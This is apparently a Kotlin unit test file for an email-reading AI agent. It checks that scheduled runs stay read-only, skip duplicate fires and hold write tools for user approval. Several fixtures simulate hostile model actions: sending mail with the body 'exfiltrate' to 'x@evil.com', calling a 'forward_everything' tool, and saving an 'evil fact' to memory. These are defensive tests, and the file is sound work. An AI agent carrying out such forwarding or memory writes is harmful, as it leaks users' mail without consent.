package com.aurviz.agent

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

// Ticket 13/24: scheduled Worker runs the loop headless on the read-only
// allowlist, records schedule_runs with idempotency scheduleId+fireTime,
// and never executes sends/schedule-writes (PendingApproval + tested).
// Seams: SCHEDULED_RUN_ALLOWLIST contents, scheduledRegistry filtering,
// runScheduledRoutine outcomes (Ran / DuplicateSkipped), ScheduleRunStore
// idempotency, PendingApprovalStore recording, reconnect wording.
class ScheduledRunTest {

    private class FakeScheduledGmail(var expired: Boolean = false) : GmailApi {
        val sentRaws = mutableListOf<String>()
        private val rows = listOf(EmailSummary("m1", "boss@work.com", "Q3 plan", "draft", true))

        private fun auth() {
            if (expired) throw GmailException(401, "gmail is not connected: token expired")
        }

        override fun send(rawBase64Url: String) {
            sentRaws += rawBase64Url
        }

        override fun listInbox(): List<EmailSummary> {
            auth()
            return rows
        }

        override fun searchInbox(query: String, max: Int): List<EmailSummary> {
            auth()
            return rows.take(max.coerceIn(1, 25))
        }

        override fun readMessage(id: String): EmailDetail {
            auth()
            val row = rows.first { it.id == id }
            return EmailDetail(row.id, row.from, row.subject, row.snippet, "body text", emailSource(row.id))
        }
    }

    private fun fullRegistry(gmail: FakeScheduledGmail, schedules: InMemoryScheduleStore = InMemoryScheduleStore(), memories: InMemoryStore = InMemoryStore()): ToolRegistry =
        defaultToolRegistry(gmailApi = gmail, scheduleStore = schedules, memoryStore = memories)

    private fun answer(text: String) = LlmResult(toolCalls = emptyList(), content = text)

    private fun routine(
        schedule: Schedule = Schedule("sched_1", "check emails", 9, 0),
        fireTime: Long = 1_000L,
        llm: ChatLlmProvider,
        registry: ToolRegistry,
        runs: ScheduleRunStore = InMemoryScheduleRunStore(),
        approvals: PendingApprovalStore = InMemoryPendingApprovalStore(),
    ): ScheduledRunOutcome = runScheduledRoutine(schedule, fireTime, llm, registry, runs, approvals, nowMs = { fireTime + 50 })

    // --- Seam 1: the allowlist is exactly the ADR-0002 read set. ---

    @Test
    fun allowlistIsExactlyTheReadTools() {
        assertEquals(
            setOf("search_emails", "read_email", "get_page_text", "search_memory", "list_schedules"),
            SCHEDULED_RUN_ALLOWLIST,
        )
    }

    // --- Seam 2: scheduledRegistry keeps reads, neuters every write. ---

    @Test
    fun scheduledRegistryKeepsReadsUngatedAndForcesWritesThroughTheGate() {
        val gmail = FakeScheduledGmail()
        val readOnly = scheduledRegistry(fullRegistry(gmail))
        for (name in SCHEDULED_RUN_ALLOWLIST) {
            assertFalse("allowlisted $name must stay ungated", readOnly.requiresConfirmation(name))
        }
        for (blocked in listOf("send_email", "create_schedule", "cancel_schedule", "save_memory", "open_url", "click", "scroll", "extract")) {
            assertTrue("$blocked must be gated in scheduled runs", readOnly.requiresConfirmation(blocked))
        }
        val refused = readOnly.execute("send_email", mapOf("to" to "a@b.c", "subject" to "s", "body" to "b"))
        assertTrue(refused is ToolResult.Failure)
        assertTrue(gmail.sentRaws.isEmpty())
    }

    @Test
    fun scheduledRegistryKeepsUnknownToolsUnknown() {
        val readOnly = scheduledRegistry(fullRegistry(FakeScheduledGmail()))
        val unknown = readOnly.execute("forward_everything", mapOf("to" to "evil@x.com"))
        assertTrue(unknown is ToolResult.Failure)
        assertTrue((unknown as ToolResult.Failure).error.contains("unknown tool"))
    }

    // --- Seam 3: headless run on reads posts the summary notification. ---

    @Test
    fun readOnlyRunSucceedsAndPostsSummaryNotification() {
        val gmail = FakeScheduledGmail()
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(listOf(ToolCall("c1", "search_emails", mapOf("query" to "boss"))), null),
                    answer("1 important email from your boss"),
                ),
            )
        val runs = InMemoryScheduleRunStore()
        val approvals = InMemoryPendingApprovalStore()
        val outcome = routine(llm = llm, registry = fullRegistry(gmail), runs = runs, approvals = approvals)
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertEquals(ScheduleRunStatus.SUCCESS, outcome.run.status)
        assertEquals("sched_1", outcome.run.scheduleId)
        assertEquals(1_000L, outcome.run.fireTime)
        assertTrue(outcome.run.durationMs >= 0)
        assertTrue(outcome.blocked.isEmpty())
        assertTrue(approvals.list().isEmpty())
        assertTrue(gmail.sentRaws.isEmpty())
        assertTrue(outcome.notification.text.contains("check emails"))
        assertTrue(outcome.notification.text.contains("1 important email"))
        assertEquals(1, runs.list().size)
    }

    // --- Seam 3b: sends never execute; a PendingApproval row is recorded. ---

    @Test
    fun sendAttemptNeverExecutesAndRecordsPendingApproval() {
        val gmail = FakeScheduledGmail()
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(listOf(ToolCall("c1", "send_email", mapOf("to" to "x@y.z", "subject" to "Hi", "body" to "b"))), null),
                    answer("Held for your approval"),
                ),
            )
        val runs = InMemoryScheduleRunStore()
        val approvals = InMemoryPendingApprovalStore()
        val registry = fullRegistry(gmail)
        val outcome = routine(llm = llm, registry = registry, runs = runs, approvals = approvals)
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertTrue("nothing may send from a scheduled run", gmail.sentRaws.isEmpty())
        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, outcome.run.status)
        assertEquals(1, outcome.blocked.size)
        val approval = approvals.list().single()
        assertEquals("send_email", approval.toolName)
        assertEquals("sched_1", approval.scheduleId)
        assertEquals("x@y.z", approval.arguments["to"])
        assertTrue(approval.reason.contains("never executed"))
        assertTrue(outcome.notification.text.contains("Confirmation"))
    }

    @Test
    fun scheduleWritesAndMemoryWritesNeverExecute() {
        val gmail = FakeScheduledGmail()
        val schedules = InMemoryScheduleStore()
        val memories = InMemoryStore()
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(
                        listOf(
                            ToolCall("c1", "create_schedule", mapOf("task" to "spam", "when" to "at 9am")),
                            ToolCall("c2", "cancel_schedule", mapOf("schedule_id" to "sched_9")),
                            ToolCall("c3", "save_memory", mapOf("text" to "evil fact")),
                        ),
                        null,
                    ),
                    answer("Nothing changed"),
                ),
            )
        val approvals = InMemoryPendingApprovalStore()
        val outcome = routine(llm = llm, registry = fullRegistry(gmail, schedules, memories), approvals = approvals)
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, outcome.run.status)
        assertTrue(schedules.list().isEmpty())
        assertTrue(memories.list().isEmpty())
        assertEquals(3, approvals.list().size)
        assertEquals(setOf("create_schedule", "cancel_schedule", "save_memory"), approvals.list().map { it.toolName }.toSet())
    }

    // --- Seam 4: idempotency — a double-fire never double-runs. ---

    @Test
    fun doubleFireWithSameKeyRunsTheLoopOnce() {
        val gmail = FakeScheduledGmail()
        val llm = FakeLlmProvider(listOf(answer("morning summary")))
        val runs = InMemoryScheduleRunStore()
        val approvals = InMemoryPendingApprovalStore()
        val registry = fullRegistry(gmail)
        val first = routine(llm = llm, registry = registry, runs = runs, approvals = approvals)
        assertTrue(first is ScheduledRunOutcome.Ran)
        val seenAfterFirst = llm.seenMessages.size
        val second = routine(llm = llm, registry = registry, runs = runs, approvals = approvals)
        assertTrue(second is ScheduledRunOutcome.DuplicateSkipped)
        second as ScheduledRunOutcome.DuplicateSkipped
        assertEquals((first as ScheduledRunOutcome.Ran).run, second.run)
        assertEquals("loop must not run again for the same scheduleId+fireTime", seenAfterFirst, llm.seenMessages.size)
        assertEquals(1, runs.list().size)
    }

    @Test
    fun differentFireTimeRunsAgain() {
        val llm = FakeLlmProvider(listOf(answer("hi")))
        val runs = InMemoryScheduleRunStore()
        val approvals = InMemoryPendingApprovalStore()
        val registry = fullRegistry(FakeScheduledGmail())
        val schedule = Schedule("sched_1", "check emails", 9, 0)
        assertTrue(runScheduledRoutine(schedule, 1_000L, llm, registry, runs, approvals, nowMs = { 1_050L }) is ScheduledRunOutcome.Ran)
        assertTrue(runScheduledRoutine(schedule, 2_000L, llm, registry, runs, approvals, nowMs = { 2_050L }) is ScheduledRunOutcome.Ran)
        assertEquals(2, runs.list().size)
    }

    // --- Seam 5: expired Gmail token posts Reconnect instead of failing silently. ---

    @Test
    fun expiredGmailTokenRecordsAuthErrorWithReconnectNotification() {
        val gmail = FakeScheduledGmail(expired = true)
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(listOf(ToolCall("c1", "search_emails", mapOf("query" to "boss"))), null),
                    answer("could not read mail"),
                ),
            )
        val outcome = routine(llm = llm, registry = fullRegistry(gmail))
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertEquals(ScheduleRunStatus.AUTH_ERROR, outcome.run.status)
        assertTrue(outcome.run.error.orEmpty().contains("not connected", ignoreCase = true))
        assertTrue(outcome.notification.title.contains("Reconnect Gmail"))
        assertTrue(gmail.sentRaws.isEmpty())
    }

    // --- Seam 6: loop failures are recorded, never thrown. ---

    @Test
    fun loopTransportFailureIsRecordedAsFailedRun() {
        val failingLlm =
            object : ChatLlmProvider {
                override fun chat(messages: List<ChatMessage>): LlmResult =
                    throw LlmException(HttpFailure("error", null, true), "HTTP 500")
            }
        val outcome = routine(llm = failingLlm, registry = fullRegistry(FakeScheduledGmail()))
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertEquals(ScheduleRunStatus.FAILED, outcome.run.status)
        assertTrue(outcome.run.error.orEmpty().contains("500"))
        assertTrue(outcome.notification.text.contains("check emails"))
    }

    // --- Seam 7: run store idempotency contract (Room adapter mirrors this). ---

    @Test
    fun runStoreClaimIsIdempotentOnScheduleIdPlusFireTime() {
        val runs = InMemoryScheduleRunStore()
        val pid = runs.claim("sched_1", 1_000L)
        assertTrue(pid != null)
        assertEquals(null, runs.claim("sched_1", 1_000L))
        assertTrue(runs.claim("sched_1", 2_000L) != null)
        runs.finish(pid!!, ScheduleRunStatus.SUCCESS, error = null, result = "done", durationMs = 12L)
        val found = runs.find("sched_1", 1_000L)!!
        assertEquals(ScheduleRunStatus.SUCCESS, found.status)
        assertEquals("done", found.result)
        assertEquals(12L, found.durationMs)
        assertEquals(2, runs.list().size)
    }

    // --- Seam 8: Room adapters round-trip through fake DAOs. ---

    private class FakeScheduleRunDao : ScheduleRunDao {
        val rows = mutableListOf<ScheduleRunRow>()
        private var nextPid = 0L
        override fun insertIgnore(row: ScheduleRunRow): Long {
            if (rows.any { it.scheduleId == row.scheduleId && it.fireTime == row.fireTime }) return -1L
            nextPid += 1
            rows += row.copy(pid = nextPid)
            return nextPid
        }
        override fun find(scheduleId: String, fireTime: Long): ScheduleRunRow? =
            rows.firstOrNull { it.scheduleId == scheduleId && it.fireTime == fireTime }
        override fun findPid(scheduleId: String, fireTime: Long): Long? =
            rows.firstOrNull { it.scheduleId == scheduleId && it.fireTime == fireTime }?.pid
        override fun reclaimStaleRunning(scheduleId: String, fireTime: Long, nowMs: Long, ttlMs: Long): Int {
            val index =
                rows.indexOfFirst {
                    it.scheduleId == scheduleId && it.fireTime == fireTime &&
                        it.status == ScheduleRunStatus.RUNNING.name && nowMs - fireTime > ttlMs
                }
            if (index < 0) return 0
            rows[index] = rows[index].copy(status = ScheduleRunStatus.RUNNING.name, error = "stale RUNNING claim reclaimed; retrying")
            return 1
        }
        override fun listAll(): List<ScheduleRunRow> = rows.toList()
        override fun finish(pid: Long, status: String, error: String?, result: String?, durationMs: Long) {
            val index = rows.indexOfFirst { it.pid == pid }
            rows[index] = rows[index].copy(status = status, error = error, result = result, durationMs = durationMs)
        }
    }

    private class FakePendingApprovalDao : PendingApprovalDao {
        val rows = mutableListOf<PendingApprovalRow>()
        private var nextPid = 0L
        override fun insert(row: PendingApprovalRow): Long {
            nextPid += 1
            rows += row.copy(pid = nextPid)
            return nextPid
        }
        override fun findById(pid: Long): PendingApprovalRow? = rows.firstOrNull { it.pid == pid }
        override fun listAll(): List<PendingApprovalRow> = rows.toList()
        override fun deleteById(pid: Long): Int = if (rows.removeAll { it.pid == pid }) 1 else 0
    }

    @Test
    fun roomRunStoreRoundTripsAndIgnoresDuplicates() {
        val store = RoomScheduleRunStore(FakeScheduleRunDao())
        val pid = store.claim("sched_7", 5_000L)
        assertTrue(pid != null)
        assertEquals(null, store.claim("sched_7", 5_000L))
        store.finish(pid!!, ScheduleRunStatus.BLOCKED_WRITE, error = null, result = "held", durationMs = 7L)
        val found = store.find("sched_7", 5_000L)!!
        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, found.status)
        assertEquals("held", found.result)
        assertEquals(7L, found.durationMs)
    }

    @Test
    fun roomReclaimKeepsRunningLeaseForRetry() {
        val dao = FakeScheduleRunDao()
        val store = RoomScheduleRunStore(dao)
        val fireTime = 1_000L
        val pid = store.claim("sched_9", fireTime)!!
        assertEquals(null, store.resetStaleRunning("sched_9", fireTime, fireTime + 60_000L))
        assertEquals(pid, store.resetStaleRunning("sched_9", fireTime, fireTime + STALE_RUN_TTL_MS + 1))
        assertEquals(ScheduleRunStatus.RUNNING, store.find("sched_9", fireTime)!!.status)
    }

    @Test
    fun roomApprovalStoreRoundTrips() {
        val store = RoomPendingApprovalStore(FakePendingApprovalDao())
        val saved =
            store.save(
                PendingApproval(
                    scheduleId = "sched_7",
                    toolName = "send_email",
                    arguments = mapOf("to" to "x@y.z"),
                    reason = "scheduled run: sensitive tool held for an in-app Confirmation decision, never executed",
                ),
            )
        assertEquals("send_email", saved.toolName)
        val listed = store.list().single()
        assertEquals("send_email", listed.toolName)
        assertEquals("x@y.z", listed.arguments["to"])
        assertEquals("sched_7", listed.scheduleId)
        assertTrue(listed.reason.contains("never executed"))
    }

    // --- Seam 9: headless chat replays turns through the fallback seam. ---

    @Test
    fun headlessChatReplaysMessagesThroughProviders() {
        val fake = FakeLlmProvider(listOf(answer("second")))
        val chat = HeadlessChatLlm(listOf(NamedProvider("fake", "k", fake)))
        val out = chat.chat(listOf(ChatMessage(role = "user", content = "hi")))
        assertEquals("second", out.content)
        assertEquals(1, fake.seenMessages.size)
        assertTrue(fake.seenMessages[0].any { it.content.orEmpty().contains("hi") })
    }

    // --- Seam 10: stale RUNNING claims are reclaimed; fresh ones skip. ---

    @Test
    fun staleRunningClaimIsReclaimedAsFreshLease() {
        val runs = InMemoryScheduleRunStore()
        val fireTime = 1_000L
        val pid = runs.claim("sched_1", fireTime)!!
        // Fresh duplicate still loses the race.
        assertEquals(null, runs.resetStaleRunning("sched_1", fireTime, fireTime + 60_000L))
        // After the TTL the crashed run is reclaimed as a RUNNING lease —
        // never terminally marked, so the due run retries instead of
        // skipping forever.
        val reclaimed = runs.resetStaleRunning("sched_1", fireTime, fireTime + STALE_RUN_TTL_MS + 1)
        assertEquals(pid, reclaimed)
        val row = runs.find("sched_1", fireTime)!!
        assertEquals(ScheduleRunStatus.RUNNING, row.status)
        assertTrue(row.error!!.contains("reclaimed"))
    }

    @Test
    fun crashedRunRerunsInsteadOfSkippingForever() {
        val gmail = FakeScheduledGmail()
        val runs = InMemoryScheduleRunStore()
        val fireTime = 1_000L
        runs.claim("sched_1", fireTime)
        // Simulate process death: claim without finish.
        val llm = FakeLlmProvider(listOf(LlmResult(listOf(ToolCall("c1", "search_emails", mapOf("query" to "boss"))), null), answer("done")))
        val outcome =
            runScheduledRoutine(
                Schedule("sched_1", "check emails", 9, 0),
                fireTime,
                llm,
                fullRegistry(gmail),
                runs,
                InMemoryPendingApprovalStore(),
                nowMs = { fireTime + STALE_RUN_TTL_MS + 1 },
            )
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        assertEquals(ScheduleRunStatus.SUCCESS, (outcome as ScheduledRunOutcome.Ran).run.status)
    }

    @Test
    fun freshRunningDuplicateStillSkips() {
        val runs = InMemoryScheduleRunStore()
        val fireTime = 1_000L
        runs.claim("sched_1", fireTime)
        val outcome =
            runScheduledRoutine(
                Schedule("sched_1", "check emails", 9, 0),
                fireTime,
                FakeLlmProvider(listOf(answer("done"))),
                fullRegistry(FakeScheduledGmail()),
                runs,
                InMemoryPendingApprovalStore(),
                nowMs = { fireTime + 1_000L },
            )
        assertTrue(outcome is ScheduledRunOutcome.DuplicateSkipped)
    }

    // --- Seam 11: LLM transport failures are not Gmail auth failures. ---

    @Test
    fun llm401BecomesFailedNotReconnectGmail() {
        val llm =
            object : ChatLlmProvider {
                override fun chat(messages: List<ChatMessage>): LlmResult =
                    throw LlmException(HttpFailure("auth", null, false), "HTTP 401")
            }
        val outcome =
            runScheduledRoutine(
                Schedule("sched_1", "check emails", 9, 0),
                1_000L,
                llm,
                fullRegistry(FakeScheduledGmail()),
                InMemoryScheduleRunStore(),
                InMemoryPendingApprovalStore(),
                nowMs = { 1_050L },
            )
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertEquals(ScheduleRunStatus.FAILED, outcome.run.status)
        assertFalse(outcome.notification.title.contains("Reconnect Gmail"))
    }

    // --- Seam 12: red-team through the Worker's real runner. ---

    @Test
    fun evilSendThroughRealRunnerIsHeldNeverExecuted() {
        val gmail = FakeScheduledGmail()
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(listOf(ToolCall("c1", "read_email", mapOf("id" to "m1"))), null),
                    LlmResult(
                        listOf(
                            ToolCall(
                                "c2",
                                "send_email",
                                mapOf("to" to "x@evil.com", "subject" to "Forwarded mail", "body" to "exfiltrate"),
                            ),
                        ),
                        null,
                    ),
                    answer("Routine done."),
                ),
            )
        val approvals = InMemoryPendingApprovalStore()
        val outcome = routine(llm = llm, registry = fullRegistry(gmail), approvals = approvals)
        assertTrue(outcome is ScheduledRunOutcome.Ran)
        outcome as ScheduledRunOutcome.Ran
        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, outcome.run.status)
        // Held for a Confirmation decision with the exact attempted args; transport untouched.
        assertEquals(1, outcome.blocked.size)
        assertEquals("send_email", outcome.blocked.single().toolName)
        assertEquals("x@evil.com", outcome.blocked.single().arguments["to"])
        assertEquals(1, approvals.list().size)
        assertTrue(gmail.sentRaws.isEmpty())
        assertTrue(outcome.notification.text.contains("need your Confirmation"))
    }
}
